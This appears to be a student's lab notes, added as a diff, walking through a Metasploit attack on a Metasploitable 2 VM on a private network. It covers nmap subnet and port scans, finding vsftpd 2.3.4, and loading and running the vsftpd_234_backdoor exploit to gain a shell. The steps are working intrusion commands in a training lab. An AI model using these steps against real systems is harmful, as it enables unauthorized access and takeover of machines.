@@ -1,0 +1,62 @@
+1.my ip: 10.0.2.15
+
+2.nmap -sV 10.0.2.0/24 (for serching all divise ip addrese)
+
+metaploit 2 ip : 10.0.2.5
+
+3.nmap -sP 10.0.2.5 (for open port 1000)
+
+by searching open port we find 50 port open .Than we open msfconsole for searching exploiat of 
+those open port or version .
+
+4.to open metasploit framework - msfconsole 
+
+work on ftp explit 
+
+21/tcp   open  ftp         vsftpd 2.3.4
+
+5.than we put (search vsftpd) to search vsftpd exploit boom we find an exploit of this exict 
+version
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+6.than we have to use this modules for that (use exploit/unix/ftp/vsftpd_234_backdoor) than 
+hit enter
+
+7. show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+here RHOSTS means many host we can spacifi 
+
+if we find only (RHOST) than we can only one host spacifi 
+
+8. to target host (set RHOSTS [one ip or ip range])
+example :
+	set RHOSTS 10.0.2.5 ( here we set remote host 10.0.2.5 as a terget host)
+
+
+9.just type (exploit) for brack the machine that it
+
+	for proof ( we type some linux command that is our machine now
+		we can do what we want)
+
+
+
